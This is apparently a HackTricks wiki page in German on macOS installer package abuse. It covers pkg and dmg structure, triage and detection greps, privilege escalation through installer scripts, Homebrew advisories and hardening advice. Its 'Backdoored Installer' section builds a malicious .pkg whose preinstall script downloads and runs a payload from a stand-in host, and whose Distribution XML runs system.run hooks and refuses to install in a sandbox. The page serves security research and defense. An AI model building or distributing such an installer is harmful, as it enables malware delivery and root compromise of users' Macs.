# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

Ein **Installer-Paket** von macOS (auch als `.pkg`-Datei bezeichnet) ist ein Dateiformat, das von macOS zur **Verteilung von Software** verwendet wird. Diese Dateien sind wie eine **Box, die alles enthält, was eine Software benötigt**, um korrekt installiert und ausgeführt zu werden.

Die Paketdatei selbst ist ein Archiv, das eine **Hierarchie von Dateien und Verzeichnissen enthält, die auf dem Zielcomputer installiert werden**. Sie kann auch **Scripts** enthalten, die Aufgaben vor und nach der Installation ausführen, z. B. das Einrichten von Konfigurationsdateien oder das Bereinigen alter Softwareversionen.

### Package Structure

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Anpassungen (Titel, Begrüßungstext …) sowie Script- und Installationsprüfungen
- **PackageInfo (xml)**: Informationen, Installationsanforderungen, Installationsort und Pfade zu den auszuführenden Scripts
- **Bill of materials (bom)**: Liste der zu installierenden, zu aktualisierenden oder zu entfernenden Dateien mit Dateiberechtigungen
- **Payload (CPIO archive gzip compressed)**: Zu installierende Dateien am in PackageInfo angegebenen `install-location`
- **Scripts (CPIO archive gzip compressed)**: Vor- und Nachinstallations-Scripts sowie weitere Ressourcen, die zur Ausführung in ein temporäres Verzeichnis extrahiert werden.

### Dekomprimieren
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Um den Inhalt des Installers zu visualisieren, ohne ihn manuell zu dekomprimieren, kannst du auch das kostenlose Tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) verwenden.

### Kurztipps für die statische Triage

Wenn das Ziel die Analyse ist, solltest du versuchen, das Paket **nicht zuerst mit `Installer.app` zu öffnen**. Einige Pakete können Code ausführen, sobald Installer sie öffnet (zum Beispiel über `system.run()` oder Installer-Plug-ins). Daher ist die Offline-Extraktion normalerweise der sicherere Ausgangspunkt.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG-Grundinformationen

DMG-Dateien, auch Apple Disk Images genannt, sind ein von Apples macOS verwendetes Dateiformat für Disk Images. Eine DMG-Datei ist im Wesentlichen ein **mountbares Disk Image** (sie enthält ihr eigenes Dateisystem), das rohe Blockdaten enthält, die typischerweise komprimiert und manchmal verschlüsselt sind. Wenn du eine DMG-Datei öffnest, **mountet macOS sie, als wäre sie eine physische Festplatte**, wodurch du auf ihren Inhalt zugreifen kannst.

> [!CAUTION]
> Beachte, dass **`.dmg`**-Installer **so viele Formate** unterstützen, dass einige davon in der Vergangenheit Schwachstellen enthielten, die missbraucht wurden, um **kernel code execution** zu erlangen.

### Struktur eines Disk Images

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Die Hierarchie einer DMG-Datei kann je nach Inhalt unterschiedlich sein. Bei Application-DMGs folgt sie jedoch üblicherweise dieser Struktur:

- Top Level: Dies ist das Root-Verzeichnis des Disk Images. Es enthält häufig die Anwendung und möglicherweise einen Link zum Applications-Ordner.
- Application (.app): Dies ist die eigentliche Anwendung. Unter macOS ist eine Anwendung typischerweise ein Paket, das viele einzelne Dateien und Ordner enthält, aus denen die Anwendung besteht.
- Applications Link: Dies ist eine Verknüpfung zum Applications-Ordner unter macOS. Dadurch wird die Installation der Anwendung vereinfacht. Du kannst die .app-Datei auf diese Verknüpfung ziehen, um die App zu installieren.

## Privesc durch pkg abuse

### Ausführung aus öffentlichen Verzeichnissen

Wenn ein Pre- oder Post-Installation-Script eine Datei wie **`/var/tmp/Installerutil`** ausführt und ein Angreifer diese Datei ersetzen kann, kann der Angreifer seine Privileges eskalieren, wenn der Installer sie aufruft. Die zitierten Vorträge und Walkthroughs zeigen Varianten dieses unsicheren Musters mit externen Scripts.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Dies ist eine [öffentliche Funktion](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), die von mehreren Installern und Updatern aufgerufen wird, um etwas als **root** zu **auszuführen**. Diese Funktion akzeptiert den **Pfad** der **Datei**, die **ausgeführt** werden soll, als Parameter. Wenn ein Angreifer diese Datei jedoch **modifizieren** könnte, wäre er in der Lage, ihre Ausführung mit root zu **missbrauchen**, um **Privileges zu eskalieren**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Weitere Informationen finden Sie in diesem Vortrag: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Missbrauch von Umgebungsvariablen und Shebangs

Aktuelle PackageKit-Bugs haben gezeigt, dass Installer-Skripte häufig als **vertrauenswürdiger Root-Code** ausgeführt werden, während sich weiterhin vom Angreifer kontrollierter Kontext in der Nähe befindet. Achten Sie bei der Prüfung von Herstellerpaketen besonders auf:

- Shell-Interpreter wie `#!/bin/zsh` / `#!/bin/bash`
- Aufrufe wie `sudo -u $USER`, `launchctl asuser` oder jegliche Logik, die `$USER`, `$HOME`, `PATH`, `TMPDIR` oder relative Pfade als vertrauenswürdig behandelt
- Interpreter, die keine Shells sind und möglicherweise vom Benutzer kontrollierte Init-Dateien oder Bibliotheken laden
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Für den PackageKit root-environment-Bug aus dem Jahr 2024 (Vererbung von `~/.zshenv` / `~/.bash*` während vom Benutzer initiierter Installationen) siehe [die generische macOS-privesc-Seite](../macos-privilege-escalation.md). Wenn das Paket **Apple-signed** ist, kann derselbe Script-Bug **SIP/TCC-relevant** werden, da `system_installd` möglicherweise `com.apple.rootless.install.heritable` trägt; siehe [die SIP-Seite](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Stateful inputs und implizite Callbacks

Beschränke die Überprüfung nicht auf offensichtliche command injection. Ein root-`preinstall`/`postinstall` kann eine trust boundary überschreiten, sobald es **state konsumiert, der bereits vor der Installation existierte**: vorhersehbare Dateien in `/tmp` oder `/var/tmp`, einen vorhandenen, vom Benutzer beschreibbaren Installationsbaum, Konfigurationsdateien, Repository-Metadaten oder einen Benutzernamen, der später an `chown` übergeben wird.<sup>[[9]](#references)[[10]](#references)</sup>

Zwei aktuelle Homebrew-Installer-Schwachstellen veranschaulichen wiederverwendbare Varianten:

- **Vom Angreifer ausgewählte Ownership:** Ein package-user override wurde aus der vorhersehbaren `/var/tmp/.homebrew_pkg_user.plist` gelesen, ohne deren Owner, Modus, ACLs, Symlink-Zustand oder Provenance zu validieren. Ein Benutzer mit geringen Privilegien konnte sein eigenes Konto auswählen, worauf ein späteres root-`postinstall` den Homebrew-Baum und den Cache rekursiv auf dieses Konto übertragen hätte. Dies war eine privilege-assignment flaw, keine shell injection.<sup>[[9]](#references)</sup>
- **Tool-Callbacks aus einem vorhandenen Baum:** Ein root-`postinstall` führte `git checkout` innerhalb einer Installation aus, die absichtlich von ihrem normalen Benutzer beschreibbar war. Das Platzieren eines ausführbaren `.git/hooks/post-checkout` wandelte daher ein späteres GUI/MDM-Package-Upgrade in eine root code execution um. Im Intel-Pfad bewahrte das Zusammenführen des paketierten `.git`-Verzeichnisses mit dem vorhandenen Repository außerdem vom Angreifer hinzugefügte Hooks.<sup>[[10]](#references)</sup>

Das zweite Primitive lässt sich während eines autorisierten Tests leicht modellieren; der Trigger tritt erst auf, wenn der verwundbare privilegierte Installer später eine Hook-fähige Git-Operation ausführt.<sup>[[10]](#references)</sup>
```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```
Erweitere verschachtelte Pakete und ordne jede von Angreifern kontrollierte Quelle einem privilegierten Sink zu. Suche zusätzlich zur direkten Ausführung nach Parsern, Änderungen von Besitzrechten und Tools mit Plug-in-/Hook-Mechanismen.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```
Zur Härtung sollten privilegierte Eingaben in ein root-owned Staging-Verzeichnis verschoben und jeder Pfad unmittelbar vor der Verwendung validiert werden (reguläre Datei, erwarteter Besitzer/Modus, keine unsichere ACL und kein Symlink-Traversal). Vermeide es, den Besitz rekursiv aus einer nicht vertrauenswürdigen Identität heraus zu ändern. Wenn Git über einen bereits vorhandenen Tree ausgeführt werden muss, unterdrücke Callbacks ausdrücklich (zum Beispiel mit `git -c core.hooksPath=/dev/null ...`) oder ersetze die Repository-Metadaten atomar, bevor Git aufgerufen wird.<sup>[[9]](#references)[[10]](#references)</sup>

### Ausführung durch Mounting

Wenn ein Installer nach `/tmp/fixedname/bla/bla` schreibt, ist es möglich, einen **Mount** über `/tmp/fixedname` mit `noowners` zu **erstellen**, sodass du **jede Datei während der Installation ändern** und den Installationsprozess missbrauchen kannst.

Ein Beispiel dafür ist **CVE-2021-26089**, mit dem ein **periodisches Script überschrieben** werden konnte, um eine Ausführung als root zu erreichen. Weitere Informationen findest du im Vortrag: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg als Malware

### Empty Payload

Es ist möglich, einfach eine **`.pkg`**-Datei mit **pre- und post-install-Scripts** zu erzeugen, ohne irgendeinen echten Payload außer der Malware innerhalb der Scripts.<sup>[[2]](#references)</sup>

### JS in Distribution xml

Es ist möglich, **`<script>`**-Tags in die **Distribution-xml**-Datei des Pakets einzufügen. Dieser Code wird ausgeführt und kann mithilfe von **`system.run`** **Befehle ausführen**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Bei Distribution packages hängt dies normalerweise davon ab, dass die Datei `Distribution` auf oberster Ebene externe Scripts aktiviert, zum Beispiel mit `allow-external-scripts="true"`. Daher reicht es nicht aus, nur `preinstall` / `postinstall` zu überprüfen: Das **Distribution XML selbst** kann `installation-check`- / `volume-check`-Hooks sowie direkte Ausführungspfade über `system.run()` / `system.runOnce()` enthalten.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

Malicious installer mit einem Script und JS-Code in dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Unpacking Pkgs: Ein Blick in Macos Installer Packages und häufige Sicherheitslücken](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: „Die wilde Welt der macOS Installer“ - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Unpacking Pkgs: Ein Blick in MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Exploiting Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [SIP mit Apple-signierten Packages brechen](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: „Mount(ain) of Bugs“ - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Tod durch 1000 Installer auf macOS und alles ist kaputt!](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [Homebrew macOS Installer vertraut einer von Benutzern kontrollierten package-user plist](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [Root code execution über Git hooks in einem macOS PKG postinstall](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
